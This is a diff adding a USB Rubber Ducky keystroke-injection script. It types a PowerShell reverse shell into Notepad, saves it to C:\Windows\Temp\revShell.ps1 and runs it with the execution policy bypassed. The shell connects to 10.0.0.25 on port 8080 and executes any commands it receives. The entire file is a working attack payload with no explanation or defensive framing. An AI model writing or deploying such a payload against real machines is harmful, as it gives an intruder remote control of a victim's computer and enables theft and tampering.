@@ -1,0 +1,80 @@
+REM Open notepad
+DELAY 2000
+GUI r
+DELAY 1000
+STRING notepad C:\Windows\Temp\revShell.ps1
+ENTER
+DELAY 2000
+REM Clean up if it exist and contain something
+CONTROL a
+DELAY 500
+DELETE
+REM Write the script CHANGE the IP of 
+STRING $socket = new-object System.Net.Sockets.TcpClient('10.0.0.25', 8080);
+ENTER
+DELAY 500
+STRING if($socket -eq $null){exit 1}
+ENTER
+DELAY 500
+STRING $stream = $socket.GetStream();
+ENTER
+DELAY 500
+STRING $writer = new-object System.IO.StreamWriter($stream);
+ENTER
+DELAY 500
+STRING $buffer = new-object System.Byte[] 1024;
+ENTER
+DELAY 500
+STRING $encoding = new-object System.Text.AsciiEncoding;
+ENTER
+DELAY 500
+STRING do{
+ENTER
+DELAY 500
+STRING   $writer.Write("> ");
+ENTER
+DELAY 500
+STRING   $writer.Flush();
+ENTER
+DELAY 500
+STRING   $read = $null;
+ENTER
+DELAY 500
+STRING   while($stream.DataAvailable -or ($read = $stream.Read($buffer, 0, 1024)) -eq $null){}
+ENTER
+DELAY 500
+STRING   $out = $encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n","");
+ENTER
+DELAY 500
+STRING   if(!$out.equals("exit")){
+ENTER
+DELAY 500
+STRING      $out = $out.split(' ')
+ENTER
+DELAY 500
+STRING      $res = [string](&$out[0] $out[1..$out.length]);
+ENTER
+DELAY 500
+STRING      if($res -ne $null){ $writer.WriteLine($res)}
+ENTER
+DELAY 500
+STRING    }
+ENTER
+DELAY 500
+STRING   }While (!$out.equals("exit"))
+ENTER
+DELAY 500
+STRING $writer.close();$socket.close();
+ENTER
+DELAY 500
+CONTROL S
+DELAY 500
+ALT F
+DELAY 500
+STRING X
+DELAY 1000
+REM Start the script
+GUI r
+DELAY 1000
+STRING powershell -noprofile -executionpolicy bypass -file C:\Windows\Temp\revShell.ps1
+ENTER
